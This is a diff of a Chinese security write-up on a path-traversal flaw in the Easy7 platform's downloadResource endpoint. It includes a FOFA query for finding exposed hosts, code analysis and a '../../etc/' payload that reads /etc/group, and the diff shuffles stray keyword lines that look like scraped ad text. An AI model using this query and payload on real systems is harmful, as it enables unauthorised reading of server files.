@@ -17,22 +17,12 @@ asset_dir: embedded-base64
 # fofa语法
 
 > body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7\_logo\_transparent.png") && title="平台"
->
-> 物流软件安全
 
 # 漏洞分析
 
-深入探索
-
-恶意软件分析工具
-
-漏洞修复方案
-
-mysql
-
 首先，该系统基于Spring 3.0，比较古老且WEB-INF/web.xml里没有配置任何filter进行权限校验，因此绝大部分接口都是可以直接访问的。
 
-计算机科学
+物流软件安全
 
 再来看本次的漏洞接口 /Easy7/rest/file/downloadResource 的对应方法`downloadResource()`的实现逻辑
 
@@ -84,17 +74,9 @@ public class CLS_REST_File {
                 }
 ```
 
-深入探索
-
-网络安全会议
-
-Windows安全工具
-
-SQL注入检测工具
-
 其中 `Tools.getLocalPath(pathId)` 的实现逻辑如下
 
-漏洞预警服务
+网络
 
 ```
 public static String getLocalPath(String sSrsSharePathId) {
@@ -118,4 +100,4 @@ path=group&srsPathId=../../etc/
 
 成功读取到/etc/group文件内容
 
-网络
+漏洞预警服务
